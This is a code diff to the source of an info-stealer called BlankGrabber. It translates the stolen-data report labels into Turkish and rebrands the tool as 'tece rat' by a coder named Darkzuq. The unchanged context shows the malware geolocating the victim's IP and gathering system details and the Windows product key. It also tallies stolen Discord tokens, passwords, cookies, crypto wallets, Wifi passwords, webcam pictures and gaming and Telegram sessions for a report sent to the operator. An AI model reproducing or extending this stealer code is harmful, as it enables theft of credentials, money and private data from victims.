@@ -1643,7 +1643,7 @@ class BlankGrabber:
             r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode(errors= "ignore"))
             if r.get("status") != "success":
                 raise Exception("Failed")
-            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            data = f"\nIP: {r['query']}\nBölge: {r['regionName']}\nÜlke: {r['country']}\nSaat dilimi: {r['timezone']}\n\n{'Hücresel ağ:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if len(r["reverse"]) != 0:
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
@@ -1651,27 +1651,27 @@ class BlankGrabber:
         else:
             ipinfo = data
 
-        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
+        system_info = f"Bilgisiyar ismi: {computerName}\nİşletim sistemi: {computerOS}\nToplam ram: {totalMemory}\nUUID: {uuid}\nİşlemcisi: {cpu}\nEkran Kartı: {gpu}\nWindows kimligi: {productKey}"
 
         collection = {
-            "Discord Accounts" : self.DiscordTokensCount,
-            "Passwords" : self.PasswordsCount,
+            "Discord Hesabı" : self.DiscordTokensCount,
+            "Şifreler" : self.PasswordsCount,
             "Cookies" : len(self.Cookies),
-            "History" : self.HistoryCount,
+            "Tarayıcı Geçmişi" : self.HistoryCount,
             "Autofills" : self.AutofillCount,
-            "Roblox Cookies" : self.RobloxCookiesCount,
-            "Telegram Sessions" : self.TelegramSessionsCount,
-            "Common Files" : self.CommonFilesCount,
+            "Roblox Cookies (Roblox hesabı ) " : self.RobloxCookiesCount,
+            "Telegram Hesabı" : self.TelegramSessionsCount,
+            "Common Dosyaları" : self.CommonFilesCount,
             "Wallets" : self.WalletsCount,
-            "Wifi Passwords" : self.WifiPasswordsCount,
-            "Webcam" : self.WebcamPicturesCount,
-            "Minecraft Sessions" : self.MinecraftSessions,
-            "Epic Session" : "Yes" if self.EpicStolen else "No",
-            "Steam Session" : "Yes" if self.SteamStolen else "No",
+            "Wifi Şifresi" : self.WifiPasswordsCount,
+            "kamera resmi" : self.WebcamPicturesCount,
+            "Minecraft Hesabı" : self.MinecraftSessions,
+            "Epic Hesabı" : "Yes" if self.EpicStolen else "No",
+            "Steam Hesabı" : "Yes" if self.SteamStolen else "No",
             "Uplay Session" : "Yes" if self.UplayStolen else "No",
-            "Growtopia Session" : "Yes" if self.GrowtopiaStolen else "No",
-            "Screenshot" : "Yes" if self.ScreenshotTaken else "No",
-            "System Info" : "Yes" if self.SystemInfoStolen else "No"
+            "Growtopia Hesabı" : "Yes" if self.GrowtopiaStolen else "No",
+            "Ekran resmi" : "Yes" if self.ScreenshotTaken else "No",
+            "Sistem Bilgileri" : "Yes" if self.SystemInfoStolen else "No"
         }
         
         grabbedInfo = "\n".join([key + " : " + str(value) for key, value in collection.items()])
@@ -1689,7 +1689,7 @@ class BlankGrabber:
                             "url": "https://github.com/Blank-c/Blank-Grabber",
                             "color": 34303,
                             "footer": {
-                                "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+                                "text": "tece rat       Coder : Darkzuq  :)  "
                             },
                             "thumbnail": {
                                 "url": image_url
